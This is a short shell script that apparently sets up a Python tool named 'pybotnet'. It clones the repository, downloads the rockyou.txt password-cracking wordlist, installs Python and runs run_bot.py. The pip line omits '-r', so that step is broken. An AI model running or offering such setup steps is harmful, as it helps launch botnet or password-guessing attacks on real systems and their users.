#!/bin/sh
git clone https://github.com/laudecay/pybotnet.git
curl https://www.scrapmaker.com/data/wordlists/dictionaries/rockyou.txt > rockyou.txt
sudo apt-get install python3
pip install requirements.txt
python run_bot.py
